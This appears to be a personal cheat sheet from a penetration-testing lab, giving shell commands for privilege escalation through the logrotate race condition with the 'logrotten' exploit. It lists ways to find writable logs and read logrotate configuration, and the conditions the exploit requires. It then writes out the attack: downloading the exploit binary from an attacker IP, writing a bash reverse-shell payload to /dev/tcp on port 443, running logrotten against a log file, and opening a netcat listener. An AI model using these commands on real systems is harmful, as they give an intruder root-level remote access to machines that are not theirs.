```sh
logrotate --help
find / -name "*.log.1" -type f -writable 2>/dev/null
# lograte config and cron/service files
cat /etc/logrotate.conf
find / -name logrotate.conf -type f 2>/dev/null
cat /etc/logrotate.d/dpkg
cat /var/lib/logrotate.status
ls -la /etc/logrotate.d/
# logrotate exploitation requirement
1-Write permissions on the log files
2-Logrotate must run as a privileged user or root
3-Versions 3.8.6 OR  3.11.0 OR 3.15.0 OR 3.18.0
# exploit
curl -o logrotten http://10.10.14.235/logrottenbin
echo 'bash -i >& /dev/tcp/10.10.14.235/443 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
grep "create\|compress" /etc/logrotate.d/dpkg | grep -v "#"
./logrotten -p ./payload /home/htb-student/backups/access.log
echo 'rev shell' > /home/htb-student/backups/access.log
# listener
nc -lvnp 443
NB:
The rotation happens when somthing get added to main log file (access.log)...so when we run the logrotten command we need to trigger the rotation
```